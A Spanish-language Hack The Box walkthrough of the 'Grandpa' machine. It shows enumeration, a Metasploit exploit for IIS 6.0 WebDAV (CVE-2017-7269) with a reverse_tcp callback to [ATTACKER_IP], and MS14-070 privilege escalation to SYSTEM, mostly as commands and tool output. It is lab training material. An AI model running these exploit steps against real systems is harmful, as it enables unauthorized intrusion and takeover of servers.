---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Easy
  - HTTP
  - MicrosoftIIS
  - RCE
  - MSF
---
- [[#Enumeration|Enumeration]]
	- [[#Enumeration#System Enumeration|System Enumeration]]
	- [[#Enumeration#Port Enumeration|Port Enumeration]]
- [[#Exploitation|Exploitation]]
	- [[#Exploitation#IIS 6.0 WebDAV RCE|IIS 6.0 WebDAV RCE]]
	- [[#Exploitation#Process Migration|Process Migration]]
- [[#Privilege Escalation|Privilege Escalation]]
	- [[#Privilege Escalation#Exploits Enumeration|Exploits Enumeration]]
	- [[#Privilege Escalation#MS14-070 Privilege Escalation|MS14-070 Privilege Escalation]]

---
# Grandpa

![](Screenshots/Pasted%20image%2020260610171325.png)

>Máquina de Hack The Box llamada **[Grandpa](https://app.hackthebox.com/machines/Grandpa)**, centrada en la explotación de una vulnerabilidad de ejecución remota de código en **Microsoft IIS 6.0 WebDAV**.  
>La intrusión comienza identificando un servidor IIS vulnerable a **CVE-2017-7269**, permitiendo obtener acceso remoto como `NT AUTHORITY\NETWORK SERVICE`.  
>Posteriormente, se realiza una escalada de privilegios mediante **MS14-070 (CVE-2014-4076)**, consiguiendo acceso como `NT AUTHORITY\SYSTEM`.

---
## Enumeration
### System Enumeration

```PowerShell
ping -c 1 10.129.95.233
PING 10.129.95.233 (10.129.95.233) 56(84) bytes of data.
64 bytes from 10.129.95.233: icmp_seq=1 ttl=127 time=36.2 ms

--- 10.129.95.233 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 36.208/36.208/36.208/0.000 ms
```

El `TTL=127` es característico de sistemas Windows (normalmente 128 - 1 salto), lo que nos permite saber el sistema operativo.
### Port Enumeration

```PowerShell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.95.233 -oG allPorts
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127
```

```PowerShell
nmap -p80 -sCV 10.129.95.233 -oN targeted
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-webdav-scan: 
|   Server Date: Wed, 10 Jun 2026 15:18:57 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Server Type: Microsoft-IIS/6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

---
## Exploitation
### IIS 6.0 WebDAV RCE

La vulnerabilidad reside en el manejo de cabeceras HTTP especialmente manipuladas por parte del componente WebDAV de IIS 6.0.  
  
Un atacante remoto puede provocar un desbordamiento de búfer y ejecutar código arbitrario en el contexto del servicio web.

```PowerShell
msfconsole -q
msf > search CVE-2017-7269
Matching Modules
================

   #  Name                                                 Disclosure Date  Rank    Check  Description
   -  ----                                                 ---------------  ----    -----  -----------
   0  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow

msf > use 0 | use exploit/windows/iis/iis_webdav_scstoragepathfromurl
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     [ATTACKER_IP]    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86
   
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOSTS 10.129.95.233
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set LHOST [ATTACKER_IP]
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit
```

```PowerShell
meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
meterpreter > shell
C:\WINDOWS\system32>whoami
nt authority\network service
exit
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
 320   272   csrss.exe
 344   272   winlogon.exe
 392   344   services.exe
 404   344   lsass.exe
 580   392   svchost.exe
 668   392   svchost.exe
 732   392   svchost.exe
 780   392   svchost.exe
 796   392   svchost.exe
 944   392   spoolsv.exe
 1008  392   msdtc.exe
 1096  392   cisvc.exe
 1136  392   svchost.exe
 1192  392   inetinfo.exe
 1228  392   svchost.exe
 1372  392   VGAuthService.exe
 1420  392   vmtoolsd.exe
 1512  392   svchost.exe
 1608  392   svchost.exe
 1792  392   dllhost.exe
 1900  392   alg.exe
 1904  580   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 2104  344   logon.scr
 2412  580   wmiprvse.exe
 2984  3392  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 3392  1512  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3552  580   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 3996  1096  cidaemon.exe
 4040  1096  cidaemon.exe
 4068  1096  cidaemon.exe
```

Se obtiene una consola interactiva con `nt authority\network service`.
### Process Migration

Al no poder ejecutar el comando: `getuid`, si migra a otro proceso.

```PowerShell
exit
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
 320   272   csrss.exe
 344   272   winlogon.exe
 392   344   services.exe
 404   344   lsass.exe
 580   392   svchost.exe
 668   392   svchost.exe
 732   392   svchost.exe
 780   392   svchost.exe
 796   392   svchost.exe
 944   392   spoolsv.exe
 1008  392   msdtc.exe
 1096  392   cisvc.exe
 1136  392   svchost.exe
 1192  392   inetinfo.exe
 1228  392   svchost.exe
 1372  392   VGAuthService.exe
 1420  392   vmtoolsd.exe
 1512  392   svchost.exe
 1608  392   svchost.exe
 1792  392   dllhost.exe
 1900  392   alg.exe
 1904  580   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 2104  344   logon.scr
 2412  580   wmiprvse.exe
 2984  3392  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 3392  1512  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3552  580   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 3996  1096  cidaemon.exe
 4040  1096  cidaemon.exe
 4068  1096  cidaemon.exe
 
 meterpreter > migrate 3552
[*] Migrating from 2984 to 3552...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
```

La sesión inicial presenta limitaciones y algunas extensiones de Meterpreter no funcionan correctamente.

Para estabilizar la sesión se migra a un proceso ya ejecutado bajo el mismo contexto de seguridad (`NT AUTHORITY\NETWORK SERVICE`).

---
## Privilege Escalation
### Exploits Enumeration

Se utiliza el módulo `local_exploit_suggester` para identificar vulnerabilidades locales compatibles con la versión de Windows detectada.

```PowerShell
background
msf exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


View the full module info with the info, or info -d command.

msf post(multi/recon/local_exploit_suggester) > set SESSION 1
msf post(multi/recon/local_exploit_suggester) > exploit
============================

 #   Name                                                              Potentially Vulnerable?  Check Result
 -   ----                                                              -----------------------  ------------
 1   exploit/windows/local/ms10_015_kitrap0d                           Yes                      The service is running, but could not be validated. Version Windows Server 2003 detected but not confirmed vulnerable
 2   exploit/windows/local/ms14_058_track_popup_menu                   Yes                      The target appears to be vulnerable. Revision 3959 appears vulnerable
 3   exploit/windows/local/ms14_070_tcpip_ioctl                        Yes                      The target appears to be vulnerable. Revision 3959 appears vulnerable
 4   exploit/windows/local/ms15_051_client_copy_image                  Yes                      The target appears to be vulnerable. Revision 3959 appears vulnerable
 5   exploit/windows/local/ms16_016_webdav                             Yes                      The service is running, but could not be validated. 32-bit target detected
 6   exploit/windows/local/ppr_flatten_rec                             Yes                      The target appears to be vulnerable. Revision 3959 appears vulnerable
 7   exploit/windows/persistence/bits                                  Yes                      The target is vulnerable. Likely exploitable
 8   exploit/windows/persistence/registry_userinit                     Yes                      The target is vulnerable. Registry likely exploitable
```
### MS14-070 Privilege Escalation

La vulnerabilidad MS14-070 (CVE-2014-4076) afecta al controlador TCP/IP de Windows.

Un usuario con bajos privilegios puede aprovechar un fallo en el manejo de llamadas IOCTL para ejecutar código en modo kernel y elevar privilegios hasta `NT AUTHORITY\SYSTEM`.

```PowerShell
msf post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms14_070_tcpip_ioctl
msf exploit(windows/local/ms14_070_tcpip_ioctl) > show options
Module options (exploit/windows/local/ms14_070_tcpip_ioctl):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     [ATTACKER_IP]    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Server 2003 SP2
   
msf exploit(windows/local/ms14_070_tcpip_ioctl) > set SESSION 1
msf exploit(windows/local/ms14_070_tcpip_ioctl) > set LHOST [ATTACKER_IP]
msf exploit(windows/local/ms14_070_tcpip_ioctl) > set LPORT 1234
msf exploit(windows/local/ms14_070_tcpip_ioctl) > exploit
```

Se obtiene una consola interactiva con `NT AUTHORITY\SYSTEM`.

La flag de `usuario` se encuentra en: `C:\Documents and Settings\Harry\Desktop`.

La flag de `root` se encuentra en `C:\Documents and Settings\Administrator\Desktop`.

---